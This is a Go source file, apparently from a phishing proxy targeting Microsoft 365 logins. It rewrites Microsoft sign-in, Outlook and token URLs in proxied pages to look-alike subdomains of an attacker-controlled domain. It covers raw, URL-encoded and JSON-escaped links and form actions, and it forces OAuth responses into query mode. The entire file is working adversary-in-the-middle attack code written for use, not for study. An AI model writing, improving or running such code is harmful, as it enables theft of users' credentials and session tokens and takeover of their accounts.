package inject

import (
	"log"
	"o365/configdb"
	"regexp"
	"strings"
)

func rootDomain(host string) string {
	parts := strings.Split(host, ".")
	if len(parts) < 2 {
		return host
	}
	return strings.Join(parts[len(parts)-2:], ".")
}

// Map of Microsoft domains to MITM counterparts
var domainMap = map[string]string{
	"login.microsoftonline.com":           "login.%s",
	"outlook.office.com":                  "outlook.%s",
	"token.microsoftonline.com":           "token.%s",
	"login.live.com":                      "live.%s",
	"account.live.com":                    "account.%s",
	"logincdn.msauth.net":                 "logincdn.%s",
	"secure.aadcdn.microsoftonline-p.com": "secure.%s",
	"aadcdn.msauth.net":                   "aadcdn.%s",
	"aadcdn.msftauth.net":                 "aadcdn.%s",
}

// Determine the base MITM domain
func getMITMDomain() string {
	if IsDevMode() {
		return "microsoftlogin.com"
	}
	return configdb.GetDomain()
}

// Rewrite all Microsoft URLs in HTML to MITM equivalents
func RewriteMicrosoftURLs(html, mitmHost string) string {
	mitmBase := getMITMDomain()
	log.Println("🔁 host-rewrite →", mitmBase)

	// 1️⃣ Raw URL replacement
	for orig, replPattern := range domainMap {
		repl := strings.ReplaceAll(replPattern, "%s", mitmBase)
		html = strings.ReplaceAll(html, "//"+orig, "//"+repl)
	}

	// 2️⃣ URL-encoded
	for orig, replPattern := range domainMap {
		oldEnc := strings.ReplaceAll(orig, ".", "%2E")
		newEnc := strings.ReplaceAll(strings.ReplaceAll(replPattern, "%s", mitmBase), ".", "%2E")

		html = strings.ReplaceAll(html, "https%3A%2F%2F"+oldEnc, "https%3A%2F%2F"+newEnc)
		html = strings.ReplaceAll(html, "https%3a%2f%2f"+oldEnc, "https%3a%2f%2f"+newEnc)
	}

	// 3️⃣ JSON-escaped (\/)
	for orig, replPattern := range domainMap {
		repl := strings.ReplaceAll(replPattern, "%s", mitmBase)
		html = strings.ReplaceAll(html, "https:\\/\\/"+orig, "https:\\/\\/"+repl)
	}

	// 4️⃣ <form action="…">
	formRE := regexp.MustCompile(`(?i)(action=["']https://)([^/]+)`)
	html = formRE.ReplaceAllStringFunc(html, func(m string) string {
		parts := strings.SplitN(m, "https://", 2)
		if len(parts) != 2 {
			return m
		}
		host := strings.Split(parts[1], "\"")[0]
		if replPattern, ok := domainMap[host]; ok {
			repl := strings.ReplaceAll(replPattern, "%s", mitmBase)
			return parts[0] + "https://" + repl + "\""
		}
		return m
	})

	// 5️⃣ Force GET mode for non-OAuth2 pages
	if strings.Contains(html, "login.microsoftonline.com") &&
		!strings.Contains(html, "/oauth2/v2.0/authorize") {
		html = strings.ReplaceAll(html, "response_mode=form_post", "response_mode=query")
	}

	return html
}
